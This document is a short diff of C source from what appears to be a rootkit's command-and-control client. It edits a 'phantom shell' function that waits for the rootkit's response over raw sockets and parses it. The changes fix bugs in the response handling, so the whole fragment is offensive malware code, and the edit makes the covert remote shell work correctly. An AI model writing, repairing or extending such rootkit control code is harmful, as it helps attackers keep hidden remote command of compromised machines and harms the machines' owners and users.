@@ -201,15 +201,15 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
         }
         exit(0);
     }
-    sleep(5);
+    //sleep(0.5);
     printf("["KBLU"INFO"RESET"]""Waiting for rootkit response...\n");
-    packet = rawsocket_sniff_pattern(CC_PROT_BASELINE);
+    packet = rawsocket_sniff_pattern(CC_PROT_PHANTOM_COMMAND_RESPONSE);
     char* res = packet.payload;
     //TODO make the shell to fork and wait for response, but accept new requests meanwhile
     if(strncmp(res, CC_PROT_PHANTOM_COMMAND_RESPONSE, strlen(CC_PROT_PHANTOM_COMMAND_RESPONSE))==0){
         //Received a response
         char *p;
-        p = strtok(buf, "#");
+        p = strtok(res, "#");
         p = strtok(NULL, "#");
         if(p){
             //Print response
@@ -236,7 +236,7 @@ int phantom_shell_mode(char* buf, char* local_ip, char* dest){
 	}
 
 
-    printf("["KGRN"RESPONSE"RESET"] %s\n", res); 
+    //printf("["KGRN"RESPONSE"RESET"] %s\n", res); 
 
     free(request);  
     return 0;
